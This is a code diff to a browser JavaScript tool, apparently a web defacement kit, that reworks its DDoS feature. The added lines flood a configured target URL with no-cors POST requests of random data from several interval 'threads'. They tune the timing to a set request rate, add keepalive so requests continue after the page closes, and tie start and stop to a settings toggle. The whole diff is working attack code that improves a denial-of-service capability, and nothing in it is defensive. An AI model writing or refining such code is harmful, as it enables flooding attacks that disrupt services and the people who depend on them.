@@ -446,6 +446,8 @@
         const numThreads = defacementConfig.ddosThreads;
         const requestsPerSecond = defacementConfig.ddosRate;
         const randomStringLength = defacementConfig.ddosRandomStringLength;
+        let ddosIntervals = []; // Store interval IDs for clearing
+
 
         const generateRandomString = (length) => {
             let result = '';
@@ -459,32 +461,31 @@
 
         const attack = async () => {
             try {
-                for (let i = 0; i < requestsPerSecond; i++) {
-                    const randomString = generateRandomString(randomStringLength);
-                    const payload = { data: randomString };
+                const randomString = generateRandomString(randomStringLength);
+                const payload = { data: randomString };
 
-                    fetch(targetURL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                         body: JSON.stringify(payload), // Send data with the request
-                    })
-                    .catch(error => {
-                       // Consider implementing a less verbose error handling.  Perhaps a counter.
-                       console.debug("DDoS Request Failed (no-cors)", error); // Less verbose logging.
+                await fetch(targetURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload), // Send data with the request
+                    keepalive: true // Allows the request to continue even if the page is closed
+                })
+                .catch(error => {
+                   console.debug("DDoS Request Failed (no-cors)", error); // Less verbose logging.
+                });
 
-                    });
-                }
             } catch (e) {
                 console.error('Noodles: DDoS Failed:', e);
                 logError('DDoS Failed: ' + e.message);
             }
         };
 
-        let ddosIntervals = []; // Store interval IDs for clearing
 
         const startDDoS = () => {
+             stopDDoS(); //Ensure previous intervals are cleared before starting new ones.
+
              for (let i = 0; i < numThreads; i++) {
-                let intervalId = setInterval(attack, 1000);
+                let intervalId = setInterval(attack, 1000 / requestsPerSecond); //Adjust interval for rate
                 ddosIntervals.push(intervalId);
             }
         }
@@ -589,13 +590,12 @@
                     }
                 }
                  if (key === 'ddosEnabled') {
+                     ddosControl = performDDOS(); //Reinitialize DDOS control
+
                     if (e.target.checked) {
-                      ddosControl = performDDOS(); //Reinitialize DDOS control
                         ddosControl.startDDoS();
                     } else {
-                        if (ddosControl && ddosControl.stopDDoS) {
-                            ddosControl.stopDDoS();
-                        }
+                        ddosControl.stopDDoS();
                     }
                 }
             });
